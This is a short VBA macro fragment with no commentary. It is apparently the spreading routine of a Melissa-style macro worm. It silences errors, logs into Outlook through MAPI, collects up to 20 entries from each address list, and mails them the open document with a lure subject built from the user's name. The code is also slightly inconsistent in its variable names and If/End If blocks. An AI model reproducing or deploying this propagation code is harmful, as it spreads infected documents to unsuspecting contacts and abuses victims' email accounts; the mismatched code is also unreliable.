On error resume next
Dim DOutlook, DMapiName, BreakUmOffAS
Set DOutlook = CreateObject("Outlook.Application")
Set DMapiName = DOutlook.GetNameSpace("MAPI")
If DOutlook = "Outlook" Then
DMapiName.Logon "profile", "password"
For i = 1 To DMapiName.AddressLists.Count
Set ABook = DMapiName.AddressLists(i)
x = 1
Set BreakUmOffASlice = DOutlook.CreateItem(0)
For n = 1 To ABook.AddressEntries.Count
Pee = ABook.AddressEntries(x)
BreakUmOffAS.Recipients.Add Pee
x = x + 1
If x > 20 Then n = ABook.AddressEntries.Count
Next n
BreakUmOffAS.Subject = "Hy it's me: " & Application.UserName
BreakUmOffAS.Body = "More in the doc. "
BreakUmOffAS.Attachments.Add ActiveDocument.FullName
BreakUmOffAS.Send
Pee = ""
Next i
DMapiName.Logoff
End If
End If
End
